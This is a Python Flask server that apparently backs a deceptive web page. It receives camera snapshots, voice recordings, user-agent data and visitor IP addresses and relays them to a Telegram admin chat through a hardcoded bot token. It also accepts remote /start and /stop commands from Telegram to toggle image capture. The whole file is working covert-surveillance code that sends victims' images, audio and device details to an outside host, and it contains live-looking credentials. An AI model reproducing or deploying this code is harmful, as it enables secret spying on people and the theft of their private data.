from flask import Flask, request, jsonify, send_from_directory
from datetime import datetime
import os
from io import BytesIO
import base64
import requests
from threading import Thread

# =============================
# APP CONFIG
# =============================
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
CAPTURE_ENABLED = True 
app = Flask(
    __name__,
    template_folder=BASE_DIR,
    static_folder=BASE_DIR
)

UPLOAD_FOLDER = os.path.join(BASE_DIR, 'picture')
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

# =============================
# TELEGRAM CONFIG
# =============================
TELEGRAM_BOT_TOKEN = "7573835095:AAFbQUwn-nLyAXwFKhb3Fotpp8C-pGcU_O4"
TELEGRAM_ADMIN_ID = "6723063227"
TELEGRAM_API_URL = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}"

# =============================
# TELEGRAM SEND
# =============================
def send_to_telegram(image_bytes, filename):
    try:
        files = {
            'photo': (filename, BytesIO(image_bytes), 'image/png')
        }
        data = {
            'chat_id': TELEGRAM_ADMIN_ID,
            'caption': '📸 New Picture'
        }
        requests.post(
            f'{TELEGRAM_API_URL}/sendPhoto',
            files=files,
            data=data,
            timeout=10
        )
    except Exception as e:
        print("Telegram image error:", e)


def send_audio_to_telegram(audio_bytes, filename, mime):
    try:
        files = {
            'audio': (filename, BytesIO(audio_bytes), mime)
        }
        data = {
            'chat_id': TELEGRAM_ADMIN_ID,
            'caption': '🎙 Voice recording'
        }
        print('[AUDIO]', filename, mime, len(audio_bytes))
        requests.post(
            f'{TELEGRAM_API_URL}/sendAudio',
            files=files,
            data=data,
            timeout=20
        )
    except Exception as e:
        print("Telegram audio error:", e)

# =============================
# ROUTES
# =============================
@app.route('/')
def index():
    return send_from_directory(BASE_DIR, 'index.html')

@app.route('/luv.js')
def serve_js():
    return send_from_directory(BASE_DIR, 'luv.js')

@app.route('/style.css')
def serve_css():
    return send_from_directory(BASE_DIR, 'style.css')

# =============================
# SAVE AUDIO (MATCH JS)
# =============================
@app.route('/save_audio', methods=['POST'])
def save_audio():
    try:
        if 'audio' not in request.files:
            return jsonify({'success': False, 'error': 'No audio file'}), 400

        audio_file = request.files['audio']
        mime = request.form.get('mime', audio_file.mimetype)

        audio_bytes = audio_file.read()

        # iOS vs others
        if 'mp4' in mime:
            ext = 'm4a'
            mime_type = 'audio/mp4'
        else:
            ext = 'webm'
            mime_type = 'audio/webm'

        filename = f'voice_{datetime.now().strftime("%Y%m%d_%H%M%S")}.{ext}'

        Thread(
            target=send_audio_to_telegram,
            args=(audio_bytes, filename, mime_type),
            daemon=True
        ).start()

        return jsonify({'success': True})

    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

# =============================
# LOG USER AGENT
# =============================
@app.route('/log_user_agent', methods=['POST'])
def log_user_agent():
    try:
        data = request.json or {}

        ua = data.get('user_agent', 'unknown')
        platform = data.get('platform', '')
        screen = data.get('screen', '')
        dpr = data.get('dpr', '')

        message = (
            "<blockquote>"
            "📱 <b>User Agent Detected</b>\n\n"
            f"🧠 <b>UA:</b>\n<code>{ua}</code>\n\n"
            f"💻 <b>Platform:</b> {platform}\n"
            f"🖥 <b>Screen:</b> {screen}\n"
            f"🔍 <b>DPR:</b> {dpr}\n"
            f"🌐 <b>IP:</b> {request.remote_addr}"
            "</blockquote>"
        )

        requests.post(
            f"{TELEGRAM_API_URL}/sendMessage",
            data={
                "chat_id": TELEGRAM_ADMIN_ID,
                "text": message,
                "parse_mode": "HTML"
            },
            timeout=10
        )

        return jsonify({"success": True})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500

# =============================
# SAVE IMAGE
# =============================
@app.route('/save_image', methods=['POST'])
def save_image():
    global CAPTURE_ENABLED

    if not CAPTURE_ENABLED:
        return jsonify({'success': False, 'stopped': True})

    try:
        data = request.json or {}
        image_data = data.get('image')


        if not image_data:
            return jsonify({'success': False}), 400

        if image_data.startswith('data:image'):
            image_data = image_data.split(',')[1]

        image_bytes = base64.b64decode(image_data)

        filename = f"miss_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
        filepath = os.path.join(UPLOAD_FOLDER, filename)

        with open(filepath, 'wb') as f:
            f.write(image_bytes)

        Thread(
            target=send_to_telegram,
            args=(image_bytes, filename),
            daemon=True
        ).start()

        return jsonify({'success': True})

    except Exception as e:
        return jsonify({'success': False, 'message': str(e)}), 500

@app.route('/ping', methods=['GET'])
def ping():
    return "pong", 200

@app.route('/telegram_webhook', methods=['POST'])
def telegram_webhook():
    global CAPTURE_ENABLED

    data = request.json or {}
    message = data.get('message', {})
    text = message.get('text', '')
    chat_id = message.get('chat', {}).get('id')

    if str(chat_id) != TELEGRAM_ADMIN_ID:
        return jsonify({'ok': True})

    if text == '/stop':
        CAPTURE_ENABLED = False
        requests.post(
            f"{TELEGRAM_API_URL}/sendMessage",
            data={
                "chat_id": TELEGRAM_ADMIN_ID,
                "text": "🛑 Image capture stopped"
            }
        )

    elif text == '/start':
        CAPTURE_ENABLED = True
        requests.post(
            f"{TELEGRAM_API_URL}/sendMessage",
            data={
                "chat_id": TELEGRAM_ADMIN_ID,
                "text": "▶️ Image capture resumed"
            }
        )

    return jsonify({'ok': True})

if __name__ == '__main__':
    app.run(debug=False)
